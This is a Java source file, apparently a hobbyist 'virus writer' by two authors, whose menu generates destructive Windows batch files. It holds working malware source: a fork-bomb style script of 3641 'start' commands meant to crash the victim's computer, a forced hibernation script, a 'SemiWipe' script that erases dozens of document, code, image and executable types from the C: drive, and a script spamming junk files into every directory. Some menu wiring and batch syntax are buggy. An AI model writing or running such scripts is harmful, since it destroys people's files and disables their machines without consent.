import java.io.*;

/**
 * This class is the "virus" writer, all virus methods are contained here.
 * @author Nate&Jojo
 *	
 */

public class eveWriter 
{

	/////////////////////////////////////////////////////////
	
	public static void virusMenu()		//Virus writer menu
	{
		System.out.println("//=========================//");
		System.out.println("// 1: Print OverStart      //");	//	Opens 3641 Command Windows :) This will most likely crash their computer.
		System.out.println("// 2: Print FakeCSGO (WIP) //");	//	The idiot test, if they get freaked out by this they're bad.
		System.out.println("// 3: Print PCShutdown     //");	//	Shuts down the pc, simple really.
		System.out.println("// 4: Print SemiWipe       //");	//	Goes to their C: drive and erases almost everything. (NOT TESTED)
		System.out.println("// 5: Print FileSpam       //");	//	Spams .troll files in the directory where activated. (NOT TESTED)
		System.out.println("// 0: Main Menu            //");	//	Returns to main menu, does NOT reprint the menu itself.
		System.out.println("//=========================//");
		
		int restart = 0;	
		do
		{
			 int menuChoice = Expo.enterInt();
			 restart = 0;
			 System.out.println();
			 switch (menuChoice)													
			 {
			 
			 	case 1:		//Start Overflow
			 	{
			 		startOverflow();
			 		restart = 1;
			 		break;
			 	}
			 	
			 	case 2:		//Fake CSGO
			 	{	
			 		fileSpam();
			 		restart = 1;
			 		break;
			 	}
			 	
			 	case 3:		//PC Shutdown
			 	{
			 		pcShutdown();
			 		restart = 1;
			 		break;
			 	}
			 	
			 	case 4:		//Semi Wipe
			 	{
			 		semiWipe();
			 		restart = 1;
			 		break;
			 	}
			 	
			 	case 5:		//File Spam
			 	{
			 		restart = 1;
			 		break;
			 	}
			 	
			 	case 0:		//Main Menu
			 	{
			 		eveMenuMethods.mainMenu();
			 		break;
			 	}
			 	
			 	default:		//The idiot sequence
			 	{
			 		System.out.println("*-That is not one of the choices. Please select an option on the list.");
			 		restart = 1;
			 	}	 	
			 	
			 }
		}
		while (restart != 0); 
	}
	
	/////////////////////////////////////////////////////////
	
	public static void startOverflow()		//Start Overflow
	{
		
 	       try {
 	       BufferedWriter out = new BufferedWriter(new FileWriter("OverStart.bat"));
 	           for (int i = 0; i < 3641; i++) {
 	               out.write("start");
 	               out.newLine(); 	           }
	           out.close();
         } catch (IOException e) {}	
	}
	
	/////////////////////////////////////////////////////////
	
	public static void fakeCSGO()		//Fake CSGO
	{
		/* try {  											
	 	        BufferedWriter out = new BufferedWriter(new FileWriter("FakeCSGO.bat"));   
	 	        out.write("");
	 	        out.newLine();
	 	            
	 	            out.close();
	 	        } catch (IOException e) {}  */
	}
	
	/////////////////////////////////////////////////////////
	
	public static void pcShutdown()		//PC Shutdown
	{
		try {  											
	        BufferedWriter out = new BufferedWriter(new FileWriter("PCShutdown.bat"));   
	        out.write("start");
	        out.newLine();
	        out.write("shutdown.exe /h");
	        out.newLine();    
	        out.close();
	        } catch (IOException e) {}
	}

	/////////////////////////////////////////////////////////
	
	public static void semiWipe()		//Semi Wipe
	{
		try {  											
 	        BufferedWriter out = new BufferedWriter(new FileWriter("SemiWipe.bat"));   
 	        out.write("cd\\");
 	        out.newLine();
 	        out.write("erase *.java erase *.class erase *.txt erase *.htm erase *.html erase *.jcp erase *.jcw erase *.jcu erase *.rbt erase *.doc erase *.docx erase *.ppt erase *.pptx erase *.css erase *.gpi erase *.jar erase *.txt erase *.dat erase *.py erase *.c erase *.CPP erase *.exe erase *.html erase *.zip erase *.xrb erase *.XLS erase *.XLSX erase *.RTF erase *.PDF erase *.JPEG erase *.JPG erase *.HTM erase *.GIF erase *.BMP erase *.AIF erase *.AIFF erase *.AU erase *.AVI erase *.DIF erase *.CSV erase *.MOV erase *.QT erase *.MID erase *.MIDI erase *.RA	erase *.SIT erase *.TAR erase *.TIF erase *.TXT erase *.PNG erase *.IDW erase *.IAM erase *.IPT erase *.FOLDER ");
 	        out.newLine();
 	        out.write("cd C:\\");
 	        out.newLine();
 	        out.write("erase *.java erase *.class erase *.txt erase *.htm erase *.html erase *.jcp erase *.jcw erase *.jcu erase *.rbt erase *.doc erase *.docx erase *.ppt erase *.pptx erase *.css erase *.gpi erase *.jar erase *.txt erase *.dat erase *.py erase *.c erase *.CPP erase *.exe erase *.html erase *.zip erase *.xrb erase *.XLS erase *.XLSX erase *.RTF erase *.PDF erase *.JPEG erase *.JPG erase *.HTM erase *.GIF erase *.BMP erase *.AIF erase *.AIFF erase *.AU erase *.AVI erase *.DIF erase *.CSV erase *.MOV erase *.QT erase *.MID erase *.MIDI erase *.RA	erase *.SIT erase *.TAR erase *.TIF erase *.TXT erase *.PNG erase *.IDW erase *.IAM erase *.IPT erase *.FOLDER ");    
 	        out.close();
 	        } catch (IOException e) {} 
	}
	
	/////////////////////////////////////////////////////////
	
	public static void fileSpam()		//File Spam
	{
		try {  											
	        BufferedWriter out = new BufferedWriter(new FileWriter("FileSpam.bat"));   
	        out.write("@echo off");
	        out.newLine();
	        out.write("color 0b");
	        out.write("for //r //d %%a in (*) do (for //l %%b in (1,1,100) do (Echo. > %%a\\%%b.TROLL)");
	        out.close();
	        } catch (IOException e) {}
	}
	
	/////////////////////////////////////////////////////////

}
